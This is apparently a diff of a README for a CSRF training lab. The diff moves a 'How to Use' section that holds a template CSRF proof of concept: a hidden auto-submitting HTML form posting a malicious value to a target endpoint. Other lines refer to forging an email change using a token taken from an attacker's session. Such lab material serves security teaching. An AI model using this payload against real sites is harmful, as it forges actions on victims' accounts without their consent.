@@ -147,43 +147,6 @@ DB_CHARSET=utf8mb4
 
 ---
 
-## 🚀 How to Use
-
-### Step 1 — Login
-Navigate to the lab and sign in using the credentials above.
-
-### Step 2 — Read the Objective
-Each lab displays:
-- The vulnerable feature being targeted
-- Your goal as the attacker
-- Optional hints to guide your approach
-
-### Step 3 — Craft Your Exploit
-Build a CSRF payload tailored to the lab's vulnerability. A typical base payload looks like:
-
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>CSRF PoC</title>
-</head>
-<body>
-  <form id="csrfForm"
-        action="http://TARGET/vulnerable-endpoint"
-        method="POST"
-        style="display:none;">
-    <input type="hidden" name="param" value="malicious-value">
-  </form>
-  <script>
-    document.getElementById('csrfForm').submit();
-  </script>
-</body>
-</html>
-```
-
-> Each lab has a different target endpoint and parameters — adapt accordingly.
-
 ### 🔬 Lab 4
 
 <div align="center">
@@ -257,6 +220,45 @@ Change the **victim's email address** by forging a request that includes:
 ```
 
 > Replace `VALID_TOKEN_FROM_ATTACKER_SESSION` with a real token extracted from the attacker account's session.
+
+---
+
+## 🚀 How to Use
+
+### Step 1 — Login
+Navigate to the lab and sign in using the credentials above.
+
+### Step 2 — Read the Objective
+Each lab displays:
+- The vulnerable feature being targeted
+- Your goal as the attacker
+- Optional hints to guide your approach
+
+### Step 3 — Craft Your Exploit
+Build a CSRF payload tailored to the lab's vulnerability. A typical base payload looks like:
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF PoC</title>
+</head>
+<body>
+  <form id="csrfForm"
+        action="http://TARGET/vulnerable-endpoint"
+        method="POST"
+        style="display:none;">
+    <input type="hidden" name="param" value="malicious-value">
+  </form>
+  <script>
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>
+```
+
+> Each lab has a different target endpoint and parameters — adapt accordingly.
 
 ---
 
